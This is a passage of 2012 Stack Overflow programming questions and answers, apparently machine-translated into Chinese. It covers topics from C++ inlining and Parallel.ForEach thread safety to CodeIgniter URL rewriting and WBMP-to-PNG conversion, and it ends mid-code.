> ID：11927326
> 
> 赞同：2
> 
> 时间：2012-08-13T01:47:35.493
> 
> 标签：jquery, html

目前，Chrome 中的占位符显示为“日期/月份/年份”，我如何强制执行自己的占位符属性？

```
<input type="date" name="date" value="" class="date" size="40" placeholder="Delivery Date (dd/mm/yy)*"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:15:40.277

date- 的输入元素[不支持](http://www.whatwg.org/specs/web-apps/current-work/multipage/the-input-element.html#input-type-attr-summary)placeholder 属性`type`。

# c# - 订单项在水晶报表中重复出现

> ID：11927327
> 
> 赞同：1
> 
> 时间：2012-08-13T01:47:53.170
> 
> 标签：c#, winforms, c#-4.0, crystal-reports

我是水晶报表的新手，无法找到如何正确列出我的订单项。我的报告将毫无问题地运行，但我的订单项会重复多次。例如，费用Dtls 中的每一行没有四个不同的行项目，而是在多个页面上重复。如果我将报表上的字段移动到标题，我只会得到一行而不是四行。我还在选项中选中了不同的记录。这是我的查询。任何帮助将不胜感激！

```
 private void launchReport(int pKReport)
    {
        using (DataClasses1DataContext db = new DataClasses1DataContext())
        {
            var query = (from s in db.expenseHdrs
                        join d in db.expenseDtls on s.rptNo equals d.rptNo
                        where s.rptNo == pKReport
                        from g in db.employees
                        join r in db.expenseHdrs on g.pk equals r.empPk
                        select new { s.period, s.description, s.department, s.rptNo,            
                        s.reimbursement, g.name, d.expDate, d.expType, d.expDesc});

            CrystalReport1 cr1 = new CrystalReport1();
            cr1.SetDataSource(query);
            crystalReportViewer1.ReportSource = cr1;
        }
    } 
```

# objective-c - @同步与锁定/解锁

> ID：11927331
> 
> 赞同：0
> 
> 时间：2012-08-13T01:48:50.087
> 
> 标签：objective-c, multithreading, synchronized, locks

我是 Objective-C 的新手。我应该什么时候使用`@synchronized`，什么时候应该使用`lock/unlock`？我的背景主要是Java。我知道在 Java 中，获得显式锁允许您执行更复杂、广泛和灵活的操作（相对于发布顺序等），而`synchronized`关键字强制锁以块结构的方式使用，并且它们还必须以它们被收购的相反顺序发布。Objective-C 中是否存在相同的原理？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T02:04:06.283

许多人会认为以任意顺序锁定/解锁是错误，而不是功能。也就是说，它很容易导致死锁。

无论如何，除了作用域的细节之外`@synchonized()`， , 或任何其他互斥体之间几乎没有区别。`-lock/-unlock`它们昂贵、脆弱、容易出错，而且通常，让它们绝对正确会导致类似于单线程解决方案的性能（但具有线程的复杂性）。

新的热点是排队。队列的重量往往要轻得多，因为它们通常不需要系统调用来进行占大多数调用的“快速路径”操作。他们也往往更能表达意图。

Grand Central Dispatch 或`NSOperationQueue`具体来说。后者在当前操作系统版本中建立在前者的基础上。GCD 的 API 往往是较低级别的，但它们非常强大并且非常简单。 `NSOperationQueue`是更高级别的并且允许直接表达依赖关系等。

我建议从[Cocoa concurrency guide](http://developer.apple.com/library/ios/#documentation/General/Conceptual/ConcurrencyProgrammingGuide/Introduction/Introduction.html)开始。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T02:03:19.793

您通常是正确的。 `@synchronized`获取一个“附加”到给定对象的锁（`@synchronized`指令中引用的对象不必是锁）。就像在 Java 中一样，它定义了一个新块，并且在开始时获取锁，并在退出时释放，无论是通过正常离开块还是通过异常。因此，正如您所猜到的，锁以与获取相反的顺序释放。

# php - 通过 cmd 运行 file_put_contents 不会产生与浏览器相同的结果

> ID：11927336
> 
> 赞同：0
> 
> 时间：2012-08-13T01:49:39.837
> 
> 标签：php, xml

我正在尝试运行一个简单的脚本，该脚本从网站获取 xml 文件并将其保存到文件中，下面是函数

```
/* update exchange rates */
public function getLatestExchangeRates(){       
   $xml = file_get_contents("http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml"); 
   file_put_contents("xml/exchange_rates.xml", $xml);
}

echo "Update Exchange Rates <br>\n";
$scraper->getLatestExchangeRates(); 
```

在 chrome 中运行此脚本有效，但在使用以下语句在 cmd 提示符下运行它时

`C:\xampp\php\php.exe -f C:\xampp\htdocs\sites\bk\update_exchange_rates.php`

在控制台中给我以下错误..

`warning: file_put_contents(xml/exchange_rates.xml: failed to open stream: no such file or directory in C:....`

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:11:33.290

最简单的解决方法是使用

```
__DIR__ 
```

全局内容来构建使用的路径。

```
$file = __DIR__ . "/xml/exchange_rates.xml" 
```

将为您提供当前脚本运行的目录，这将解决通过 apache 和命令行运行的问题。

# html - 启用网络软件脱机工作的选项？或者也许构建桌面软件？

> ID：11927339
> 
> 赞同：3
> 
> 时间：2012-08-13T01:50:01.393
> 
> 标签：html, web-applications, desktop-application, offline, cache-manifest

我为美容院创建了一个日程安排软件作为 Web 应用程序。这个想法是企业主可以安排与发型师的客户约会。我让它基于网络，因为最终这些美容院需要集成到更大的云服务中。到目前为止，我只投入了大约 40 个小时的编码。

我遇到的一个挑战是许多美容院的互联网连接可能很差。他们可能会遇到持续数小时到数天的临时中断。但是在此期间，他们仍然希望访问此 Web 应用程序.. 至少出于只读目的。

我知道现代浏览器中的 html 5 通过诸如 localStorage 和缓存清单之类的东西支持离线功能。在我看来，目前，我需要对现有应用程序进行彻底的重写，以利用 localStorage 和缓存清单来允许 Web 应用程序脱机工作。之所以如此，是因为我的 Web 应用程序`http://mywebsite.com/api/somefunction?queryparams=value1`通过 ajax 调用将大量信息写入/保存到 url。这些 ajax 调用需要替换为写入本地存储的函数调用。

所以我的问题是：

a) 为了使我的 Web 应用程序能够离线工作（至少，网站的只读权限应该离线），我应该将我的 ajax 调用替换为对 localStorage 的调用。这是最好的方法吗？

b) 将此应用程序创建为 .NET 桌面应用程序会更好吗？特别是如果有微软技术可以帮助在以后将存储的客户端数据与外部数据库同步？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T03:06:47.470

我的意见：

a) 我不会说你应该*替换*你的 Ajax 调用。相反，您希望您的代码在离线时注意到它，然后将内容存储在 localStorage 中。您不会总是存储在 localStorage 中，因为您的客户有时会在线。

b）我认为这是一个加载的问题。:) 所以...我的想法是：建立一个网站是有意义的，因为它可以让您在沙龙的客户从商店的计算机和其他设备上访问他们的数据。例如 - 如果沙龙的互联网访问中断，员工也许也可以通过他们的手机使用您的网站。将数据绑定到网络为他们提供了更多获取数据的方法。

# bash - & 修饰符的 bash 现实生活示例

> ID：11927342
> 
> 赞同：1
> 
> 时间：2012-08-13T01:50:05.887
> 
> 标签：bash, history

我正在寻找学习 bash 命令历史操作的新技巧，在这个页面[http://www.gnu.org/software/bash/manual/html_node/Modifiers.html#Modifiers](http://www.gnu.org/software/bash/manual/html_node/Modifiers.html#Modifiers)。我看到 & 修饰符。

当我尝试时 !!:& 不记得以前的替换。你能用真实的例子来帮助理解这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:05:29.787

第一个命令：

```
$ echo abcdabcd
abcdabcd 
```

用 gf 替换 cd。请注意，仅替换第一个匹配项

```
$ !!:s/cd/gf
echo abgfabcd
abgfabcd 
```

重复替换

```
$ !!:&
echo abgfabgf
abgfabgf 
```

# c++ - 关于 C++ 内联函数的几个问题

> ID：11927343
> 
> 赞同：4
> 
> 时间：2012-08-13T01:50:34.523
> 
> 标签：c++, inline

我参加的课程中的培训材料似乎做出了两个相互矛盾的陈述。

一方面：

> “使用内联函数通常会加快执行速度”

另一方面：

> “由于更频繁的交换，使用内联函数可能会降低性能”

**问题1：**这两种说法都是真的吗？

**问题2：**这里的“交换”是什么意思？

请看一下这个片段：

```
int powA(int a, int b) {
  return (a + b)*(a + b) ;
}

inline int powB(int a, int b) {
  return (a + b)*(a + b) ;
}

int main () {
    Timer *t = new Timer;

    for(int a = 0; a < 9000; ++a) {
        for(int b = 0; b < 9000; ++b) {
             int i = (a + b)*(a + b);       //              322 ms   <-----
            //  int i = powA(a, b);         // not inline : 450 ms
            //  int i = powB(a, b);         // inline :     469 ms
        }
    }

    double d = t->ms();
    cout << "-->  " << d << endl; 

    return 0;
} 
```

**问题 3：**`powA`为什么和之间的性能如此相似`powB`？我原本预计`powB`性能会达到 322 毫秒，因为它毕竟是内联的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T01:54:52.010

## 问题 1

是的，在特定情况下，这两种说法都可能是真的。显然它们不会同时为*真*。

## 问题2

“交换”可能是对操作系统分页行为的引用，当内存压力变高时，页面被换出到磁盘。

实际上，如果您的内联函数很小，那么由于消除了函数调用和返回的开销，您*通常会注意到性能改进。*但是，在极少数情况下，您可能会导致代码增长到无法完全驻留在 CPU 缓存中（在性能关键的紧密循环期间），并且您可能会遇到性能下降的情况。但是，如果您在该级别进行编码，那么您可能应该直接用汇编语言进行编码。

## 问题 3

`inline`修饰符是对编译器的提示*，*它可能要考虑内联编译给定的函数。它不必遵循您的指示，结果也可能取决于给定的编译器选项。您始终可以查看生成的汇编代码以了解它的作用。

你的基准测试甚至可能没有做你想做的事情，因为你的编译器可能足够聪明，可以看到你甚至没有使用你分配给的函数调用的结果`i`，所以它甚至可能不会费心去调用你的函数。再次查看生成的汇编代码。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T02:02:04.253

`inline`在调用站点插入代码，保存堆栈帧的创建，保存/恢复寄存器和调用（分支）。换句话说，使用`inline`（当它工作时）类似于为内联函数编写代码来代替它的调用。

但是，`inline`不能保证做任何事情并且依赖于编译器。编译器有时会`inline`使用非内联函数（好吧，当链接时优化打开时，它可能是链接器执行此操作，但很容易想象可以在编译器级别完成的情况 - 例如，当内联函数是静止的）。

如果要强制 MSVC`inline`运行，请使用`__forceinline`并检查程序集。不应该有调用——你的代码应该编译成线性执行的简单指令序列。

关于速度：您确实可以通过内联小函数使您的代码更快。但是，当您使用`inline`大型函数时（并且“大型”很难定义，您需要运行测试以确定什么是大的，什么不是），您的代码大小会变得更大。这是因为内联函数的代码在调用站点一遍又一遍地重复。毕竟，调用函数的全部意义在于通过在代码中的多个位置重用同一个子例程来节省指令数。

当代码变大时，指令缓存可能会不堪重负，导致代码执行速度变慢。

需要考虑的另一点：现代无序 CPU（大多数台式机 CPU - 例如 Intel Core Duo 或 i7）有一种机制（指令跟踪）可以提前预取分支，`inline`然后在硬件级别“”。所以激进的内联并不总是有意义的。

在您的示例中，您需要查看编译器生成的程序集。`inline`版本和非`inline`版本可能相同。如果不是`inline`，请尝试`__forceinline`您正在使用的是否是 MSVC。如果两种情况下的时序相同，则意味着您的 CPU 在预取指令方面做得很好，而执行时间瓶颈在其他地方。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T01:56:18.503

交换是一个操作系统术语，用于将不同的内存页面换入和换出正在运行的进程。基本上交换需要一些时间。你的应用程序越大，它可能有越多的交换。

当您内联一个函数时，不是跳转到单个子例程，而是将整个函数的副本转储到调用位置。这会使你的程序更大，因此理论上可以导致更多的交换。

通常对于非常小的方法（例如您的 powA 和 powB），内联应该没问题并导致更快的执行，但这实际上只是“理论上” - 就挤压最后一滴性能而言，可能有“更大的鱼要炸”出你的代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T01:56:20.743

书上的陈述是正确的。换句话说，如果做得好，`inline`可以提高性能，如果做得不好，会降低性能。

最好只内联小函数。这将减少额外的汇编调用以跳转到内存中。这就是提高性能的方式。

如果您使用`inline`大型函数，这可能会导致内存分页超出缓存大小，从而导致额外的内存交换。这就是性能受到阻碍的方式。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-13T01:57:50.267

两种说法都是真的，有点。声明一个函数`inline`是编译器在可能的情况下进行内联的一个指标。编译器将（通常）使用自己的判断来判断是否实际内联，但在 C++ 中声明它`inline`确实会改变代码生成，至少对于符号生成而言。

在此上下文中，“交换”是指将可执行映像分页到磁盘。由于可执行文件较大，它可能会影响内存受限系统的性能。

在回答您的第三个问题时，编译器为这两个函数选择了相同的行为（我的猜测是非内联的）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-13T01:59:56.600

当一个普通函数被编译时，它的机器代码被编译一次，并与调用它的其他函数分开放置在一个地方。执行代码时，处理器必须跳转到存储代码的地方，这`jump`条指令需要额外的时间从内存中加载函数。有时，调用一个函数（例如虚函数）需要多次跳转（或多次加载和一次跳转）。还有一些时间用于保存和恢复寄存器，以及创建堆栈帧，对于足够小的内联函数来说，这些都不是真正必要的。

当一个内联函数被编译时，它的所有机器码都直接插入到它被调用的地方，所以`jump`指令被淘汰。编译器还会根据其环境优化内联函数的代码（例如寄存器赋值可以同时考虑函数外部和函数内部使用的变量，以尽量减少需要保存的寄存器数量）。但是，内联函数的代码可能会出现在调用函数的多个位置（如果它在调用代码中被多次调用），因此总的来说它会使您的代码库更大。这可能会导致您的代码变得足够大，以至于它不再适合 CPU 缓存，在这种情况下，处理器必须进入主内存来获取您的代码，这比从缓存中获取所有内容需要更长的时间。在某些情况下，这可以抵消消除`jump`指令，并使您的代码比内联代码慢。

“交换”通常是指虚拟内存的行为，它与 CPU 缓存具有相同的权衡，但是从磁盘加载代码所花费的时间要长得多，并且您的程序必须为此填充的内存量发挥更大的作用。您不太可能看到内联函数会影响虚拟内存性能。

显然这两种影响不会同时发生，但很难知道在任何给定情况下哪种会适用。

# linux - wpa_passphrase 是否使用散列算法？

> ID：11927347
> 
> 赞同：1
> 
> 时间：2012-08-13T01:51:12.403
> 
> 标签：linux, networking, wireless, wpa

这个问题很清楚。我想知道它是否使用散列算法，或者它只是一种加密。如果是哈希，那么使用什么算法（md5、sha1 等）？此外，路由器是否以纯文本形式比较密码以进行验证或哈希？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:03:40.323

在 WPA-PSK 中，WPA 密码和 SSID 用于派生用于加密无线流量的 256 AES 密钥。密钥派生函数是 PBKDF2，在[RFC 2898](http://www.ietf.org/rfc/rfc2898.txt)中定义。如果 SSID 的密码正确，则加密将起作用，以便客户端可以与 AP 成功通信。否则，通信将失败。这就是 AP 知道密码正确的方式（流量不是乱码）。

# ruby-on-rails - 控制器不调用 Rails 中的视图，是示例

> ID：11927356
> 
> 赞同：0
> 
> 时间：2012-08-13T01:53:33.743
> 
> 标签：ruby-on-rails, ruby-on-rails-3, login, ruby-on-rails-3.2

1 - 我的控制器是这个，但这不是调用视图，这个名称是 login.html.erb，我不明白因为发生了什么，是为了显示登录的形式。

```
class FinancesController < ApplicationController
  # GET /finances
  # GET /finances.json
  def login
    @user = User.find_by_name(params[:user])
    if @user
      session[:user_id] = @user.id
      redirect_to :action => 'index'
    else
      redirect_to login_url
    end

  end

  def index
    @finances = Finance.all(:order => "created_at")

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @finances }
    end
  end 
```

2 - 有人可以告诉我使用身份验证方法来验证示例登录用户和密码表单，可以向我展示如何使用此方法，find_by_name_and_password 不起作用。

我感谢答案，很多。

路由.rb

```
Controle::Application.routes.draw do
  match 'login' => 'finances#login' 
  resources :finances
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T04:43:15.940

检查`@user`对象。

因为，对于您的代码，如果不可用，它将重定向到您的`login`方法。`@user`

`login.html.erb`要从方法渲染`login`，不需要任何手动重定向。

# c# - Parallel.ForEach 通过多个线程改变行为

> ID：11927357
> 
> 赞同：1
> 
> 时间：2012-08-13T01:53:34.917
> 
> 标签：c#, .net, multithreading, plinq, parallel-extensions

我有一组文件正在对它们执行写操作，我正在使用`Parallel.ForEach`循环来加快速度。

问题是当我有多个线程时，它的行为不正常。该程序向 WAV 文件写入 10 次 250000 个随机字节，这将导致大约 1.3 秒的静态周期。发生的情况是多线程，在绝大多数文件中，没有任何静态，Windows 指示文件已更改，但音频内容没有，另一个问题是某些剪辑有大约 6 分钟的静态写入它，这是不可能的，代码只向每个文件写入 2500000 个字节（约 10.3 秒），因此由于某种原因，它会将字节写入错误的文件，所以有些没有静态，有些则有一个荒谬的数量。它不可能错过静态，所以它不可能是我。我知道出了点问题。

在我多线程程序之前一切正常，所以我使用`MaxDegreeofParallelism = 1`并且一切正常，所以我知道问题是由多个线程引起的。

```
Parallel.ForEach(files, new ParallelOptions{MaxDegreeOfParallelism = 4}, file =>
{
Random rand = new Random();
using (stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite))
{
FileInfo info = new FileInfo(file);
for (int i = 0; i < 10; i++)
{
    int pos = rand.Next(5000000, Convert.ToInt32(info.Length));
    for (int x = 0; x < 250000; x++)
    {
        byte number = array[rand.Next(array.Length)];
        stream.Seek(pos, SeekOrigin.Begin);
        pos += 4;
        stream.WriteByte(number);
    }
}
}
}); 
```

编辑：另一个问题是它使用多个线程写入包含关键数据的标题部分，因此没有媒体播放器识别该格式。这只发生在多个线程上，我忽略了前 500 万字节，我知道这已经足够了。

编辑：2 更新代码。

谁能阐明导致我的代码无法正常运行的多线程是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:20:24.327

[随机数生成器](http://msdn.microsoft.com/en-us/library/system.random.aspx)不是线程安全的。[Jon Skeet](https://stackoverflow.com/users/22656/jon-skeet)有一篇关于这方面的[好文章](http://msmvps.com/blogs/jon_skeet/archive/2009/11/04/revisiting-randomness.aspx)以及如何制作线程安全的随机数生成器。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T03:47:24.423

`stream`在由 执行的委托*之外*声明`Parallel.ForEach`。创建的所有线程`Parallel.ForEach`都在尝试使用相同的变量。由于没有锁定，因此未定义`stream`每个线程的值 - 您可能会看到多个线程写入同一个流，这会导致您出现奇怪的多线程行为。

尝试删除`stream`委托外部的声明，并更改

```
using (stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite)) 
```

到

```
using (Stream stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite)) 
```

# xna - Kinect sdk v1.5 使用C# XNA 4.0 框架进行人脸跟踪

> ID：11927360
> 
> 赞同：1
> 
> 时间：2012-08-13T01:54:18.437
> 
> 标签：xna, kinect

我是一名新的 kinect 开发人员，将在 c# 平台上使用 kinect v1.5 和 XNA Framework 开发一些与面部跟踪相关的应用程序。

通过使用kinect sdk和XNA 3D绘图的Basic Effect，我可以成功地获得人脸点和矩形点显示在屏幕上。

但是，我想要的是返回与用户面部完全相同的颜色像素，以便我可以将用户的真实面部映射到模型。

有没有人可以帮助回答我的问题？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T07:44:14.060

实现此目的的方法之一是使用 RGB（彩色）视频流并捕获静止图像。然后，如果需要，您可以使用 C# 枚举此图像的 X/Y 轴以获取颜色。

然而，更有效的方法是将其用作纹理并“包裹”您正在使用它创建的 3D 模型。Kinect SDK 提供了一个示例，该示例执行类似的操作，该示例称为 Face Tracking 3D - WPF。我鼓励您使用它作为您对 XNA 的基础移植并从那里开始工作。

# php - 21 Wordpress 主题中的“twentyeleven”有什么作用

> ID：11927362
> 
> 赞同：0
> 
> 时间：2012-08-13T01:55:14.550
> 
> 标签：php, wordpress, themes, theming

二十一主题几乎在每个部分都有一个小片段，例如下一个：

```
<?php

    printf( __( 'Daily Archives: %s', 'twentyeleven' ), '<span>' . get_the_date() . '</span>' );

?> 
```

这部分是什么意思？

```
'twentyeleven' 
```

我理解（或认为我理解）其余所有内容，但是如果我只是删除那部分代码，或者我应该将其更改为其他内容怎么办？

`twentyeleven`代码中间的目的是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:03:40.057

[函数参考：__](http://codex.wordpress.org/Function_Reference/_2)

## 用法：

```
<?php $translated_text = __( $text, $domain ); ?> 
```

第二个参数`$domain`是要从中获取翻译的域。所以 211 主题有自己的用于本地化字符串的翻译列表。最终它将字符串翻译`Daily Archives`成正在使用的任何语言，得到主题提供的翻译。

我查了一下，在 211 主题（在`languages`目录中）中有一个翻译文件，但实际上并没有任何翻译，所以看起来 211 主题只有英文。

查看更多关于[翻译 WordPress](http://codex.wordpress.org/Translating_WordPress)和 POT 文件的信息。

# php - Codeigniter - 子文件夹中的控制器，从 url 中删除 index.php

> ID：11927372
> 
> 赞同：1
> 
> 时间：2012-08-13T01:56:38.200
> 
> 标签：php, .htaccess, codeigniter, pretty-urls

如果我在控制器文件夹中有一些控制器而在子文件夹中有一个控制器，如何从 url 中删除“index.php”？例如，我的前端 url 看起来像这样：**domain.com/site/contact.html** 我希望我的后端 url 看起来像这样：**domain.com/system/settings/profile.html**，其中系统不是控制器，只是一个子文件夹在控制器文件夹中。当我输入**domain.com/index.php/system/settings/profile.html**时，一切正常，只是看起来不正确。这是我的 routes.php 文件中的内容：

```
$route['default_controller'] = "site";
$route['system'] = "system/login";
$route['404_override'] = 'errors/error_404'; 
```

这是我的 .htaccess 文件中的内容：

```
RewriteEngine on
RewriteCond $1    !^(index\.php|img|css|public|tmp|download|javascript|rte|document|xajax_js|robots\.txt)
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L,QSA] 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T06:38:22.480

要从 URL 中删除 index.php，首先检查 mod_rewrite 在 apache 中是否启用，然后将其添加到 .htaccess 文件中

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule .* index.php/$0 [PT,L] 
```

在 .htaccess 文件中并将 .htaccess 文件移动到 index.php 位置附近

```
/var/www/CodeIgniter/index.php
/var/www/CodeIgniter/.htaccess 
```

在配置文件夹集中的 config.php 中

```
$config['index_page'] = ''; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T09:35:19.077

用于删除 index.php

在项目的根文件夹中创建一个 .htaccess 文件并编写这么多代码：

```
<IfModule mod_rewrite.c>

RewriteEngine On

    RewriteCond $1 !^(index\.php|resources|robots\.txt)
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php/$1 [L,QSA]

</IfModule> 
```

并保存它。

从您的 URl 中删除 index.php 并享受。请注意，.htacess 不在本地机器上运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T08:36:10.633

您可以尝试设置`RewriteBase`喜欢`RewriteBase /`或`RewriteBase /site/`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-27T02:01:18.983

我的问题是 routes.php 文件中的保留控制器名称：

```
$route['system'] = "system/login"; 
```

您不能将子文件夹命名为“system”，因为根文件夹中有一个文件夹“system”。

# php - 消息表单未正确显示

> ID：11927378
> 
> 赞同：0
> 
> 时间：2012-08-13T01:58:08.997
> 
> 标签：php, html, css, forms, message

我有一个问题，我花了一整天的时间，这可能是我忽略的快速解决方案。我希望第二双眼睛能很快注意到它。

下面的链接有一个消息提交表单，由于某种原因，浏览器没有为它选择任何 CSS。它只是将所有内容显示为杂乱无章的无边框单词等。

[http://www.hiredavewaring.com/contact.html](http://www.hiredavewaring.com/contact.html) CSS 位于子文件夹 /css/swagger.css

谁能帮我？

编辑：我还不能上传截图到这个论坛，因为我太新了。但是，我已将屏幕截图上传到此链接：[http ://www.hiredavewaring.com/images/ss/problem.png](http://www.hiredavewaring.com/images/ss/problem.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:27:18.750

您在#webwrapper 的 CSS 文件的第 735 行有 2 个打开的花括号。这可能会阻止该行之后的所有内容生效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:08:31.460

改变：

```
<link rel="stylesheet" type="text/css" href="css/swagger.css" /> 
```

到：

```
<link rel="stylesheet" href="css/swagger.css" media="screen" /> 
```

# visual-studio-lightswitch - 如何在 Lightswitch 中重命名角色/用户屏幕

> ID：11927384
> 
> 赞同：1
> 
> 时间：2012-08-13T01:59:45.240
> 
> 标签：visual-studio-lightswitch

我需要在我的 Lightswitch 2011 应用程序中重命名内置的“角色”和“用户”屏幕以匹配我的屏幕命名约定（例如“查看项目”）。当您右键单击名称时，“重命名”选项被禁用。

这是否意味着这是一个不可能的要求？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T21:35:31.267

不幸的是，无法在 LightSwitch 中重命名角色和用户屏幕。但是，可以删除屏幕导航窗口中的标准屏幕并创建您自己的新替换屏幕。这样做有点麻烦，但我这样做是为了控制列的大小。构建等效屏幕只需要大约 15 分钟。

# c# - 带有自定义控件的 WPF 内存泄漏

> ID：11927390
> 
> 赞同：1
> 
> 时间：2012-08-13T02:02:06.983
> 
> 标签：c#, wpf, memory, memory-leaks

我想处理我动态添加到我的应用程序的控件。`.Remove()`垃圾收集器在从其父控件中提取对象后没有拾取该对象，并且它具有巨大的位图和几何私有成员。

我希望能够做这样的事情：

```
foreach (ScrollItem mylabel in canvas1.Children)
{
    if (mylabel.bRemove == true)
    {
        canvas1.Children.Remove(mylabel);
        mylabel = null;  // or mylabel.Dispose();
    }
} 
```

`canvas1`a 中不能有空项目，`UIObjectCollection`所以我不能将它设置为空，如果我只是`Remove()`这样，垃圾收集器就不会收集它。

我试图做类似的事情：

```
myobj = mylabel;
canvas1.Children.Remove(mylabel);
myobj = null; 
```

但这也不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T08:52:22.040

只要没有对您的对象的引用，GC 就会收集它。检查您的应用程序是否有对您的对象的任何其他引用。这通常可以是事件订阅者。您可能还想使用 .NET 内存分析器来查看是什么阻止了您的对象被 GC 处理。

# c# - 如何将 Wbmp 转换为 PNG？

> ID：11927391
> 
> 赞同：5
> 
> 时间：2012-08-13T02:02:11.993
> 
> 标签：c#, image, png, bmp

在谷歌上花了很多时间研究这个问题后，我找不到在 C# 中将 Wbmp 图像转换为 Png 格式的示例我从互联网上下载了一些 Wbmp 图像，我正在使用二进制编辑器查看它们。

有没有人有一个算法可以帮助我这样做，或者任何代码也会有所帮助。

**到目前为止我知道的事情：**

1.  第一个字节是 type*（单色图像为 0）
2.  第二个字节称为“固定头”，为 0
3.  第三个字节是图像的宽度，以像素为单位*
4.  第四个字节是图像的高度（以像素为单位）*
5.  数据字节按行排列——每像素一位：行长度不能被 8 整除时，行被 0 填充到字节边界

我完全迷失了，所以任何帮助将不胜感激

* * *

其他一些代码：

```
using System.Drawing;
using System.IO;

class GetPixel
{
   public static void Main(string[] args)
   {
      foreach ( string s in args )
      {
         if (File.Exists(s))
         {
            var image = new Bitmap(s);
            Color p = image.GetPixel(0, 0);
            System.Console.WriteLine("R: {0} G: {1} B: {2}", p.R, p.G, p.B);
         }
      }
   }
} 
```

和

```
class ConfigChecker
{
   public static void Main()
   {
      string drink = "Nothing";
      try
      {
         System.Configuration.AppSettingsReader configurationAppSettings 
            = new System.Configuration.AppSettingsReader();
         drink = ((string)(configurationAppSettings.GetValue("Drink", typeof(string))));
      }
      catch ( System.Exception )
      {
      }
      System.Console.WriteLine("Drink: " + drink);
   } // Main
} // class ConfigChecker 
```

过程 ：

1.  研究过wbmp

2.  先打开X.wbmp查看详情

3.  找出如何找到 WBMP 文件的宽度和高度（以便以后编写代码）。请注意，转换长度字节集合的最简单方法（一旦 MSB 被清除）是将实体视为 base-128。

4.  查看我更新的示例代码。

5.  我正在尝试创建一个空的 Bitmap 对象并将其宽度和高度设置为我们在 (3) 中计算的值

6.  对于每一位数据，将尝试在创建的 Bitmap 对象上执行 SetPixel。

7.  当 WBMP 宽度不是 8 的倍数时填充 0。

8.  使用 Save() 方法保存位图。

应用程序的示例用法。假设应用程序名为 Wbmp2Png。在命令行中：

```
Wbmp2Png IMG_0001.wbmp IMG_0002.wbmp IMG_0003.wbmp 
```

应用程序将每个 IMG_0001.wbmp、IMG_0002.wbmp 和 IMG_0003.wbmp 转换为 PNG 文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T03:41:20.140

试试这个代码，这行得通！

```
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

class WBmpConvertor
{
   public void Convert(string inputFile, string outputFile, ImageFormat format)
    {
        byte[] datas = File.ReadAllBytes(inputFile);
        byte tmp;
        int width = 0, height = 0, offset = 2;
        do
        {
            tmp = datas[offset++];
            width = (width << 7) | (tmp & 0x7f);
        } while ((tmp & 0x80) != 0);
        do
        {
            tmp = datas[offset++];
            height = (height << 7) | (tmp & 0x7f);
        } while ((tmp & 0x80) != 0);

        var bmp = new Bitmap(width, height, PixelFormat.Format8bppIndexed);
        BitmapData bd = bmp.LockBits(new Rectangle(0, 0, width, height),
                                     ImageLockMode.WriteOnly, bmp.PixelFormat);
        int stride = (width + 7) >> 3;
        var tmpdata = new byte[height * width];
        for (int i = 0; i < height; i++)
        {
            int pos = stride * i;
            byte mask = 0x80;
            for (int j = 0; j < width; j++)
            {
                if ((datas[offset + pos] & mask) == 0)
                    tmpdata[i * width + j] = 0;
                else
                    tmpdata[i * width + j] = 0xff;
                mask >>= 1;
                if (mask == 0)
                {
                    mask = 0x80;
                    pos++;
                }
            }
        }
        Marshal.Copy(tmpdata, 0, bd.Scan0, tmpdata.Length);

        bmp.UnlockBits(bd);
        bmp.Save(outputFile, format);
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T13:47:03.220

这似乎完成了工作。

```
using System.Drawing;
using System.IO;

namespace wbmp2png
{
    class Program
    {
        static void Main(string[] args)
        {
            foreach (string file in args)
            {
                if (!File.Exists(file))
                {
                    continue;
                }
                byte[] data = File.ReadAllBytes(file);
                int width = 0;
                int height = 0;
                int i = 2;
                for (; data[i] >> 7 == 1; i++)
                {
                    width = (width << 7) | (data[i] & 0x7F);
                }
                width = (width << 7) | (data[i++] & 0x7F);
